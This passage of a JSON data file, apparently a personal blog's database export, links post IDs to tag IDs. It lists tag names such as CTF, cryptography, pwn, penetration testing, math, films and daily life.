ghyhvhu54","_id":"cla7okct00003fs6g64k5gy5k"},{"post_id":"cla7okcsy0001fs6g1nytaq41","tag_id":"cl8wgpppm002uck6g0ln40y1l","_id":"cla7okct00005fs6g200lh5vo"},{"post_id":"cla7okcsy0001fs6g1nytaq41","tag_id":"cl8wgpppm002xck6gep5fhlju","_id":"cla7okct10007fs6g3kp4dn99"},{"post_id":"clac8pkrr0000jg6g2yw9b03q","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"clac8pkrt0001jg6gcdhvgwmz"},{"post_id":"clac8pkrr0000jg6g2yw9b03q","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"clac8pkru0004jg6g6jpx0wta"},{"post_id":"clac8pkrr0000jg6g2yw9b03q","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clac8pkrv0005jg6gagrahmsf"},{"post_id":"clazajjqr0000yo6g7vpt47ot","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clazajjqw0002yo6gegl368hc"},{"post_id":"clazajjqr0000yo6g7vpt47ot","tag_id":"cl8wgppow000cck6g1vnnarjc","_id":"clazajjqx0004yo6g7qtb19us"},{"post_id":"clazajjqv0001yo6gdnpi8t2q","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clazajjqy0007yo6g7bi7hwey"},{"post_id":"clazajjqv0001yo6gdnpi8t2q","tag_id":"cl8wgppow000cck6g1vnnarjc","_id":"clazajjqz000ayo6g2w5pdfyx"},{"post_id":"clazajjqx0003yo6g2i0zaqlz","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clazajjr0000dyo6g6g8vcd3f"},{"post_id":"clazajjqx0003yo6g2i0zaqlz","tag_id":"cl8wgppow000cck6g1vnnarjc","_id":"clazajjr1000gyo6g11ow61q0"},{"post_id":"clazajjqy0005yo6gahdt3fqu","tag_id":"cl8wgpppd001gck6gfox2dxk2","_id":"clazajjr2000iyo6gekqy252b"},{"post_id":"clazajjqy0005yo6gahdt3fqu","tag_id":"cl8wgppph0023ck6g2a0eduih","_id":"clazajjr4000lyo6g7vksc24x"},{"post_id":"clazajjqy0005yo6gahdt3fqu","tag_id":"cl8wgppph0028ck6gdt30296k","_id":"clazajjr5000nyo6gbhau5glw"},{"post_id":"clazajjqz0008yo6g4kd73ymc","tag_id":"cl8wgpppd001gck6gfox2dxk2","_id":"clazajjr5000pyo6g6tgubb0u"},{"post_id":"clazajjqz000byo6g9w3ibilt","tag_id":"cl8wgpppe001nck6g66ebb7n5","_id":"clazajjr6000ryo6gfy1r3hs2"},{"post_id":"clazajjqz000byo6g9w3ibilt","tag_id":"cl8wgpppg001tck6g2a4s9f4t","_id":"clazajjr7000syo6g7e820qod"},{"post_id":"clazajjqz000byo6g9w3ibilt","tag_id":"cl8wgpppg001xck6gf6usa7ff","_id":"clazajjr7000uyo6gdygc6nia"},{"post_id":"clazajjqz000byo6g9w3ibilt","tag_id":"cl8wgpppg0020ck6g99qbhhx0","_id":"clazajjr7000vyo6g95bhb91u"},{"post_id":"clazajjr0000eyo6g3k6x8c4n","tag_id":"cl8wgppph0023ck6g2a0eduih","_id":"clazajjr7000wyo6g12je3v8a"},{"post_id":"clazajjr0000eyo6g3k6x8c4n","tag_id":"cl8wgppph0028ck6gdt30296k","_id":"clazajjr7000xyo6gb67s0gsw"},{"post_id":"clazajjr2000jyo6g1q9qc2fl","tag_id":"cl8wgpppg001xck6gf6usa7ff","_id":"clazajjr7000yyo6g1aq75nhk"},{"post_id":"clazajjr2000jyo6g1q9qc2fl","tag_id":"cl8wgpppj002hck6g8hvw6rcu","_id":"clazajjr7000zyo6g6fs16696"},{"post_id":"clazajjr5000oyo6ghsdsefz1","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"clazajjr70010yo6gdpb8bmsr"},{"post_id":"clazajjr5000oyo6ghsdsefz1","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"clazajjr70011yo6gfm8c3mml"},{"post_id":"clazajjr5000oyo6ghsdsefz1","tag_id":"cl8wgpppo003ack6g9n3jaoky","_id":"clazajjr70013yo6gavuraulj"},{"post_id":"cldvq79nx0000g06gdqp76ra0","tag_id":"cldvq79o20001g06gc02lerjb","_id":"cldvq79o50003g06gdkybf13l"},{"post_id":"clxa5zock00007slzhjt48vze","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zocv00097slz67ed2825"},{"post_id":"clxa5zock00007slzhjt48vze","tag_id":"clxa5zoco00027slz6891hkzz","_id":"clxa5zocv000c7slzd9uy9kf3"},{"post_id":"clxa5zocm00017slz46xc0dhq","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zod9000g7slz6u50h8ir"},{"post_id":"clxa5zocm00017slz46xc0dhq","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zoda000j7slz6mcrbstb"},{"post_id":"cl9fiq3eu0000446g5bx39mt0","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodb000m7slz8xjm99af"},{"post_id":"clxa5zocr00037slzdw5h6ydn","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zodc000p7slzaxfoetli"},{"post_id":"clxa5zocr00037slzdw5h6ydn","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodd000r7slz6bjehje2"},{"post_id":"clxa5zoct00047slz3ugk88rm","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zodg000v7slzb059fk8o"},{"post_id":"clxa5zoct00047slz3ugk88rm","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodi000x7slz0ks6at1s"},{"post_id":"clxa5zocu00067slz7k0o1i5b","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zodj000z7slz8b7v83d8"},{"post_id":"clxa5zocu00067slz7k0o1i5b","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodk00117slz2w252bvp"},{"post_id":"clxa5zocv000a7slz8y0q7hle","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zodl00147slz27zh7o3g"},{"post_id":"clxa5zocv000a7slz8y0q7hle","tag_id":"clxa5zode000u7slz8h0gh7so","_id":"clxa5zodl00167slzcxy1fnh5"},{"post_id":"cl8wgppp6000rck6g9az2a35s","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodm00187slz1ef970gz"},{"post_id":"clac8pkrr0000jg6g2yw9b03q","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodn001a7slzf0if3yiu"},{"post_id":"clxa5zod9000h7slz5erfc2xv","tag_id":"clxa5zode000u7slz8h0gh7so","_id":"clxa5zodo001d7slz1w8n4ka4"},{"post_id":"clxa5zod9000h7slz5erfc2xv","tag_id":"clxa5zodk00127slz1ov1bp18","_id":"clxa5zodo001e7slz1zwphhr0"},{"post_id":"clxa5zodl00157slz6dpn0yjf","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"clxa5zodo001f7slz96wn9mfj"},{"post_id":"clxa5zodb000l7slza8bk5taz","tag_id":"clxa5zodl00177slz3s9453rm","_id":"clxa5zodq001h7slz620wbp92"},{"post_id":"clxa5zodb000l7slza8bk5taz","tag_id":"clxa5zodo001c7slz7ink3ov2","_id":"clxa5zodq001k7slzabzxayn8"},{"post_id":"clxa5zodb000o7slz78wkh8qt","tag_id":"clxa5zode000u7slz8h0gh7so","_id":"clxa5zods001n7slzfzpwflo2"},{"post_id":"clxa5zodb000o7slz78wkh8qt","tag_id":"clxa5zodk00127slz1ov1bp18","_id":"clxa5zods001o7slz9xsvejuf"},{"post_id":"cl8wgpppd001hck6ghvy29kim","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodt001q7slzhauq41jd"},{"post_id":"clxa5zodk00137slzgkymgsvg","tag_id":"cl8wgpppb0017ck6g5fk4hgpn","_id":"clxa5zodt001r7slz09u48aw5"},{"post_id":"clxa5zodk00137slzgkymgsvg","tag_id":"clxa5zodr001l7slz1g03ciih","_id":"clxa5zodt001v7slz4e0s26r1"},{"post_id":"clazajjr5000oyo6ghsdsefz1","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodu001w7slz23ph8kz9"},{"post_id":"clxa5zodq001j7slz3bnx3d0f","tag_id":"clxa5zods001p7slzcrea6zhl","_id":"clxa5zodv00217slz542y9x64"},{"post_id":"clxa5zodq001j7slz3bnx3d0f","tag_id":"clxa5zodt001s7slzeqx5b1ot","_id":"clxa5zodv00237slz0r6aa30l"},{"post_id":"cl8wgpppe001ock6g78n6dosb","tag_id":"clxa5zocu00087slz0x79fyik","_id":"clxa5zodw00257slzehdpcd0m"},{"post_id":"clxa5zodt001t7slz7mh9f1ba","tag_id":"clxa5zodu001x7slz6yzp8uak","_id":"clxa5zodw00287slzhekqcmr3"},{"post_id":"clxa5zodt001t7slz7mh9f1ba","tag_id":"clxa5zodv00227slzd71vfe0y","_id":"clxa5zodw00297slzddwafizm"},{"post_id":"clxa5zodu001y7slza8d8dq9q","tag_id":"clxa5zodw00267slz7hjdgg66","_id":"clxa5zodw002b7slze9g7hmoo"},{"post_id":"clxa5zodu001y7slza8d8dq9q","tag_id":"cl8wgpppp003ick6gh2p53r4q","_id":"clxa5zodw002c7slz8hzhe5gi"},{"post_id":"clxa5zodv00207slz1c19afpw","tag_id":"clxa5zodw002a7slzb4w6c9km","_id":"clxa5zodw002d7slz2q8w6cdd"},{"post_id":"clxa5zody002e7slz4s6q3zxp","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"clxa5zodz002g7slz5noy7ssb"},{"post_id":"clxa5zody002e7slz4s6q3zxp","tag_id":"cl8wgpppy0042ck6g8f5hcx8v","_id":"clxa5zodz002h7slz3yvjdirw"},{"post_id":"clxa5zody002f7slzb28k0u8t","tag_id":"clxa5zodw002a7slzb4w6c9km","_id":"clxa5zodz002j7slz9n534y32"}],"Tag":[{"name":"CTF","_id":"cl8wgppos0005ck6ghyhvhu54"},{"name":"密码学","_id":"cl8wgppow000cck6g1vnnarjc"},{"name":"Linux","_id":"cl8wgpppb0017ck6g5fk4hgpn"},{"name":"前端","_id":"cl8wgpppd001gck6gfox2dxk2"},{"name":"Windows","_id":"cl8wgpppe001nck6g66ebb7n5"},{"name":"WSL","_id":"cl8wgpppg001tck6g2a4s9f4t"},{"name":"VSCode","_id":"cl8wgpppg001xck6gf6usa7ff"},{"name":"Code-server","_id":"cl8wgpppg0020ck6g99qbhhx0"},{"name":"算法","_id":"cl8wgppph0023ck6g2a0eduih"},{"name":"计算机网络","_id":"cl8wgppph0028ck6gdt30296k"},{"name":"C","_id":"cl8wgpppj002hck6g8hvw6rcu"},{"name":"数学","_id":"cl8wgpppj002jck6g9lxs5340"},{"name":"格","_id":"cl8wgpppk002mck6g9ys4hmu3"},{"name":"抽象代数","_id":"cl8wgpppl002nck6gchy0gbow"},{"name":"二进制安全","_id":"cl8wgpppm002uck6g0ln40y1l"},{"name":"pwn","_id":"cl8wgpppm002xck6gep5fhlju"},{"name":"PHP","_id":"cl8wgpppm002zck6ggu1c6yck"},{"name":"Python","_id":"cl8wgpppn0035ck6gd1871maq"},{"name":"论文","_id":"cl8wgpppo003ack6g9n3jaoky"},{"name":"汇编","_id":"cl8wgpppp003ick6gh2p53r4q"},{"name":"Nginx","_id":"cl8wgpppq003tck6gbqd9esq6"},{"name":"SSL","_id":"cl8wgpppq003vck6g0oj7hwdp"},{"name":"高数","_id":"cl8wgpppy0042ck6g8f5hcx8v"},{"name":"CVP","_id":"cl8wgpppy0045ck6g7x6th6zp"},{"name":"抽象","_id":"cl915gold0006do6g0z0b6en0"},{"name":"复变函数","_id":"cl915i4sa000ddo6ggdm06fo3"},{"name":"材料力学","_id":"cldvq79o20001g06gc02lerjb"},{"name":"web","_id":"clxa5zoco00027slz6891hkzz"},{"name":"Crypto","_id":"clxa5zocu00087slz0x79fyik"},{"name":"Web","_id":"clxa5zode000u7slz8h0gh7so"},{"name":"渗透","_id":"clxa5zodk00127slz1ov1bp18"},{"name":"GPT","_id":"clxa5zodl00177slz3s9453rm"},{"name":"面试","_id":"clxa5zodo001c7slz7ink3ov2"},{"name":"代理","_id":"clxa5zodr001l7slz1g03ciih"},{"name":"电影","_id":"clxa5zods001p7slzcrea6zhl"},{"name":"生活","_id":"clxa5zodt001s7slzeqx5b1ot"},{"name":"计算机","_id":"clxa5zodu001x7slz6yzp8uak"},{"name":"学习","_id":"clxa5zodv00227slzd71vfe0y"},{"name":"计组","_id":"clxa5zodw00267slz7hjdgg66"},{"name":"杂谈","_id":"clxa5zodw002a7slzb4w6c9km"}]}}